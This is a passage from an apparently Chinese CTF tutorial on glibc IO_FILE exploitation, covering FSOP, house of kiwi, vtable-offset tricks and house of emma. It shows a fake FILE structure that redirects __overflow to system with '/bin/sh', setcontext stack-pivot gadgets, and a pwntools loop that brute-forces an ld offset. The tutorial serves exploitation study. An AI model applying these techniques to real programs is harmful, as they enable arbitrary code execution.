class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">fp-&gt;_mode &gt; <span class="number">0</span></span><br><span class="line">fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><p>   该条件可以结合<strong>house of cat</strong>使用。其中<code>_IO_vtable_offset (fp) == 0</code> 即 <code>_vtable_offset</code>为0，另外需要关注<code>_wide_data</code>结构体，该手法会在house of cat中讲解</p><p>条件满足后，会从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历FILE结构体，执行对应虚表中的<code>_IO_OVERFLOW</code>，即<code>&lt;_IO_file_jumps+24&gt;</code></p><h3 id="house-of-kiwi-malloc-assert"><a href="#house-of-kiwi-malloc-assert" class="headerlink" title="house of kiwi - __malloc_assert"></a>house of kiwi - __malloc_assert</h3><p>该手法用于在程序无<code>exit</code>时触发IO，且能控制<code>rdx</code></p><p>以下为<code>__malloc_assert</code>的代码片段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">       <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">(<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">           __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           file, line,</span><br><span class="line">           function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">           assertion);</span><br><span class="line">fflush (<span class="built_in">stderr</span>);</span><br><span class="line"><span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数调用的<code>__fxprintf</code>、<code>fflush</code>都能调用虚表中函数，有劫持的可能。</p><p>以下是进入<code>__malloc_assert</code>的方法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         prev_inuse (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>不满足以下条件任一即可进入：</p><ol><li><code>old_size &gt;=MINSIZE</code></li><li><code>old_top.pre_inuse = 0</code></li><li><code>old_top页对齐</code></li></ol><p>通常用的比较多的是第三种，因为页对齐条件较苛刻，通常修改topchunk的size都能不对齐。注意<strong>不能改的太大</strong>，否则会进入别的assert。这里修改的方式一般是构造<strong>堆重叠</strong>或<strong>largebin attack</strong></p><p>接下来讲函数的调用链，这里分<code>__fxprintf</code>和<code>fflush</code>两种方式</p><h4 id="fxprintf"><a href="#fxprintf" class="headerlink" title="__fxprintf"></a>__fxprintf</h4><p>调用链为</p><p><code>__fxprintf -&gt; __vfxprintf -&gt; locked_vfxprintf -&gt; __vfprintf_internal -&gt; _IO_new_file_xsputn </code></p><p>需要满足的条件为：</p><ol><li><code>_IO_write_ptr</code> &gt; <code>_IO_write_base</code></li><li><code>_lock</code>指向可写地址</li></ol><p>调用后，仅刷新<code>stderr</code>，调用虚表<code>_IO_file_jumps</code>中的<code>_IO_new_file_xsputn</code>，即<code>&lt;_IO_file_jumps+56&gt;</code></p><h4 id="fflush"><a href="#fflush" class="headerlink" title="fflush"></a>fflush</h4><p><code>fflush(stderr) =&gt; _IO_file_jumps =&gt; sync</code></p><p>用的比较少，没什么条件。但是因为在<code>__fxprinf</code>之后，所以需要保证<code>__fxprinf</code>不会挂掉。</p><p>好处是通过这条调用链，在调用<code>sync</code>时的<code>rdx</code>固定，都是<code>IO_helper_jumps</code>，可以结合后面讲到的<code>&lt;setcontext+61&gt;</code>利用。不过高版本中加入虚表检测，这种利用变得困难</p><h2 id="伪造FILE结构体"><a href="#伪造FILE结构体" class="headerlink" title="伪造FILE结构体"></a>伪造FILE结构体</h2><p>如何让我们伪造的FILE结构体在触发IO时被刷新？</p><p>如果使用<strong>FSOP</strong>的方式，程序从<code>_IO_list_all</code>开始沿着<code>fp -&gt; chain</code>遍历。故我们可以修改<code>_IO_list_all</code>指针，指向我们伪造的结构体，如果使用largebin attack就可以一步到位指向布置在chunk上的伪造结构体。同时还可以修改<code>_chain</code>指针，劫持到多个伪造的结构体的利用链</p><p>如果使用<strong>house of kiwi</strong>的方式，程序仅刷新<code>stderr</code>，可以修改<code>stderr</code>指针（如果可写），甚至直接修改<code>_IO_2_1_stderr</code>的内容</p><p>伪造FILE的手法繁多，这里举出最原始的一种手法作为例子</p><h3 id="上古时期的FSOP-Glibc"><a href="#上古时期的FSOP-Glibc" class="headerlink" title="上古时期的FSOP(Glibc&lt;2.24)"></a>上古时期的FSOP(Glibc&lt;2.24)</h3><p>因为触发FSOP时，会调用虚表中<code>&lt;_IO_file_jumps+24&gt;</code>处的<code>__overflow</code>函数，我们只需把该位置填入<code>system</code>的地址。当然，虚表不可写，我们可以将<code>vtable</code>处改为我们伪造的虚表。同时此时的<code>rdi</code>指向FILE结构体的<code>_flags</code>，所以可以将该位置填上<code>/bin/sh</code></p><p>构造方式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">._chain =&gt; chunk_addr1</span><br><span class="line">chunk_addr1</span><br><span class="line">&#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="comment">//对应此结构体首地址(fp)</span></span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>,</span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>,</span><br><span class="line">    _IO_write_ptr = <span class="number">0x1</span>,</span><br><span class="line">      ...</span><br><span class="line">      _mode = <span class="number">0x0</span>, <span class="comment">//一般不用特意设置</span></span><br><span class="line">      _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = chunk_addr2</span><br><span class="line">&#125;</span><br><span class="line">chunk_addr2</span><br><span class="line">&#123;</span><br><span class="line">  __dummy = <span class="number">0x0</span>,</span><br><span class="line">  __dummy2 = <span class="number">0x0</span>,</span><br><span class="line">  __finish = <span class="number">0x0</span>,</span><br><span class="line">  __overflow = system_addr,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>干净又卫生</p><h3 id="虚表偏移时代-Glibc-2-24"><a href="#虚表偏移时代-Glibc-2-24" class="headerlink" title="虚表偏移时代(Glibc&gt;&#x3D;2.24)"></a>虚表偏移时代(Glibc&gt;&#x3D;2.24)</h3><p>加入了对虚表的检查<code>IO_validate_vtable()</code>与<code>IO_vtable_check()</code>，若无法通过检查，则会报错：<code>Fatal error: glibc detected an invalid stdio handle</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t * <span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="comment">//检查vtable指针是否在glibc的vtable段中。</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>glibc中有一段完整的内存存放着各个<code>vtable</code>，其中<code>__start___libc_IO_vtables</code>指向第一个<code>vtable</code>地址<code>_IO_helper_jumps</code>，而<code>__stop___libc_IO_vtables</code>指向最后一个<code>vtable</code> <code>_IO_str_chk_jumps</code>结束的地址。若指针不在glibc的<code>vtable</code>段，会调用<code>_IO_vtable_check()</code>做进一步检查，以判断程序是否使用了外部合法的<code>vtable</code>（重构或是动态链接库中的<code>vtable</code>），如果不是则报错。</p><p>2.37以前有以下虚表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_helper_jumps</span><br><span class="line">_IO_cookie_jumps</span><br><span class="line">_IO_proc_jumps</span><br><span class="line">_IO_str_chk_jumps</span><br><span class="line">_IO_wstrn_jumps</span><br><span class="line">_IO_wstr_jumps</span><br><span class="line">_IO_wfile_jumps_maybe_mmap</span><br><span class="line">_IO_wfile_jumps_mmap</span><br><span class="line">__GI__IO_wfile_jumps</span><br><span class="line">_IO_wmem_jumps</span><br><span class="line">_IO_mem_jumps</span><br><span class="line">_IO_strn_jumps</span><br><span class="line">_IO_obstack_jumps</span><br><span class="line">_IO_file_jumps_maybe_mmap</span><br><span class="line">_IO_file_jumps_mmap</span><br><span class="line">__GI__IO_file_jumps</span><br><span class="line">_IO_str_jumps</span><br></pre></td></tr></table></figure><p>从此，虚表指针不能随意伪造了。好在这个检测依旧比较宽泛，我们依旧可以修改<code>vtable</code>为虚表内的其他指针，通过一定的<strong>偏移</strong>调用<strong>其他虚表</strong>内的函数</p><p>例如，原本house of kiwi会触发<code>&lt;_IO_file_jumps+56&gt;</code>处的<code>_IO_new_file_xsputn</code>函数，我们希望调用<code>&lt;_IO_cookie_jumps+120&gt;</code>处的<code>_IO_cookie_write</code>函数。原本<code>vtable</code>指向<code>_IO_file_jumps</code>，调用函数时则会将指针加上56。我们把<code>vtable</code>设置为<code>&lt;_IO_cookie_jumps+64&gt;</code>，那么在实际调用时，就会调用到<code>&lt;_IO_cookie_jumps+64+56&gt;</code>处的目标函数。这就是<strong>虚表偏移</strong>的思想，将执行流劫持到已有的函数上。</p><h1 id="新时代的高版本IOFILE利用"><a href="#新时代的高版本IOFILE利用" class="headerlink" title="新时代的高版本IOFILE利用"></a>新时代的高版本IOFILE利用</h1><p>高版本下的IOFILE利用方式很多，但大多不外乎都是利用<strong>虚表偏移</strong>的思想伪造FILE结构体，并通过以上的方式<strong>触发IO</strong>，从而getshell或者orw</p><p>这里介绍几种<del>我会的</del>比较好用的</p><h2 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h2><p>相较于他的实战意义，kiwi更大的价值可能在于它的两条思路，一条是上文提到的<code>__malloc_assert</code>触发IO，另一条则是<code>setcontext&lt;+61&gt;</code></p><p>这是一个函数的片段，兼具<strong>布置寄存器、栈迁移</strong>的功能，常常在沙盒限制<code>execve</code>的情况下用来打<strong>orw链</strong>，汇编代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a6d &lt;+61&gt;:    mov    rsp,QWORD PTR [rdx+0xa0]</span><br><span class="line">0x00007fa70ef04a74 &lt;+68&gt;:    mov    rbx,QWORD PTR [rdx+0x80]</span><br><span class="line">0x00007fa70ef04a7b &lt;+75&gt;:    mov    rbp,QWORD PTR [rdx+0x78]</span><br><span class="line">0x00007fa70ef04a7f &lt;+79&gt;:    mov    r12,QWORD PTR [rdx+0x48]</span><br><span class="line">0x00007fa70ef04a83 &lt;+83&gt;:    mov    r13,QWORD PTR [rdx+0x50]</span><br><span class="line">0x00007fa70ef04a87 &lt;+87&gt;:    mov    r14,QWORD PTR [rdx+0x58]</span><br><span class="line">0x00007fa70ef04a8b &lt;+91&gt;:    mov    r15,QWORD PTR [rdx+0x60]</span><br><span class="line">0x00007fa70ef04a8f &lt;+95&gt;:    test   DWORD PTR fs:0x48,0x2</span><br><span class="line">0x00007fa70ef04a9b &lt;+107&gt;:   je     0x7fa70ef04b56 &lt;setcontext+294&gt;#基本上都能跳</span><br><span class="line">---&gt;</span><br><span class="line">0x00007fa70ef04b56 &lt;+294&gt;:   mov    rcx,QWORD PTR [rdx+0xa8]</span><br><span class="line">0x00007fa70ef04b5d &lt;+301&gt;:   push   rcx</span><br><span class="line">0x00007fa70ef04b5e &lt;+302&gt;:   mov    rsi,QWORD PTR [rdx+0x70]</span><br><span class="line">0x00007fa70ef04b62 &lt;+306&gt;:   mov    rdi,QWORD PTR [rdx+0x68]</span><br><span class="line">0x00007fa70ef04b66 &lt;+310&gt;:   mov    rcx,QWORD PTR [rdx+0x98]</span><br><span class="line">0x00007fa70ef04b6d &lt;+317&gt;:   mov    r8,QWORD PTR [rdx+0x28]</span><br><span class="line">0x00007fa70ef04b71 &lt;+321&gt;:   mov    r9,QWORD PTR [rdx+0x30]</span><br><span class="line">0x00007fa70ef04b75 &lt;+325&gt;:   mov    rdx,QWORD PTR [rdx+0x88]</span><br><span class="line">0x00007fa70ef04b7c &lt;+332&gt;:   xor    eax,eax</span><br><span class="line">0x00007fa70ef04b7e &lt;+334&gt;:   ret</span><br></pre></td></tr></table></figure><p>围绕<code>rdx</code>进行参数的布置，就能设置好各个寄存器</p><p>这里最重要的两条是</p><p><code>[rdx+0xa0]</code> &#x3D;&gt; <code>rsp</code></p><p><code>[rdx+0xa8]</code> &#x3D;&gt; <code>rcx</code> &#x3D;&gt; <code>ret</code></p><p>我们通常将<code>rcx</code>布置为<code>ret</code>的gadget，这样在最后<code>ret</code>的时候就能实现栈迁移到赋给<code>rsp</code>的地址上</p><h2 id="house-of-emma"><a href="#house-of-emma" class="headerlink" title="house of emma"></a>house of emma</h2><p>可以理解为kiwi衍生出的攻击手法，需要以下三个条件</p><ol><li><p>可以<strong>任意写</strong>一个可控地址（LargeBin Attack、Tcache Stashing Unlink Attack…）</p></li><li><p>一次<strong>任意地址读</strong> 或 再来一次<strong>任意写</strong></p></li><li><p>可以<strong>触发 IO 流</strong>（FSOP、house of kiwi）</p></li></ol><p>利用的虚表为<code>_IO_cookie_jumps</code>，存在拓展结构<code>_IO_cookie_file</code>（还是<code>_IO_FILE_plus</code>加长版），多了一个函数表，存在劫持的可能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> __<span class="title">fp</span>;</span></span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_io_functions_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;        <span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;    <span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;        <span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;    <span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>需要调用的虚表函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">       || (seek_cb (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">           == <span class="number">-1</span>)</span><br><span class="line">       || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">      ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> close_cb (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里写了4个函数，其实大同小异，都调用了一个从<code>_IO_cookie_file</code>结构体的函数表中取出的函数指针，以<code>_IO_cookie_write</code>为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write;<span class="comment">//取出函数指针</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (write_cb);<span class="comment">//指针保护</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">  <span class="type">ssize_t</span> n = write_cb (cfile-&gt;__cookie, buf, size);<span class="comment">//调用函数</span></span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们只需伪造<code>_IO_cookie_file</code>结构体的函数表，就能调用任意函数。同时这里的<code>rdi</code>是可控的。如果要打getshell，可以直接构造；如果要打orw，可以利用libc中一个gadgets</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx, qword ptr [rdi + 8]; </span><br><span class="line">mov qword ptr [rsp], rax; </span><br><span class="line">call qword ptr [rdx + 0x20];</span><br></pre></td></tr></table></figure><p>完成从可控<code>rdi</code>到可控<code>rdx</code>的转换</p><p>此外，<code>_IO_cookie_file</code>里的函数指针不能直接伪造，因为默认开启了PTR_DEMANGLE （指针保护）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">uintptr_t</span> __pointer_chk_guard attribute_relro;</span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_MANGLE(var) \</span></span><br><span class="line"><span class="meta">  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard)</span></span><br><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var) PTR_MANGLE (var)</span></span><br></pre></td></tr></table></figure><p><code>__pointer_chk_guard</code>存在于TLS段上，将其ROR移位0x11后再与存入的地址进行异或</p><p><img src="/../img/IOFILE-exploit.assets/image-20230811213323111.png" alt="image-20230811213323111"></p><p><code>fs[0x30]</code>的值位于与libc相邻的ld空间中，这个位置距离libc地址的偏移固定，可能与本地patchelf后不一致，可以通过爆破得到。因为偏移的变化值往往在地址末尾的第四个、第五个数（末三位不变），可编写如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            libc_base = <span class="number">0x1234</span></span><br><span class="line">            offset = <span class="number">0x6</span> &lt;&lt; <span class="number">20</span></span><br><span class="line">            offset += x &lt;&lt; <span class="number">16</span></span><br><span class="line">            offset += y &lt;&lt; <span class="number">12</span></span><br><span class="line">            ld_base = libc_base + offset</span><br><span class="line">            log.success(<span class="string">&quot;try offset:\t&quot;</span> + <span class="built_in">hex</span>(offset))</span><br><span class="line">            <span class="comment"># your code</span></span><br><span class="line">            sh.interactive()</span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            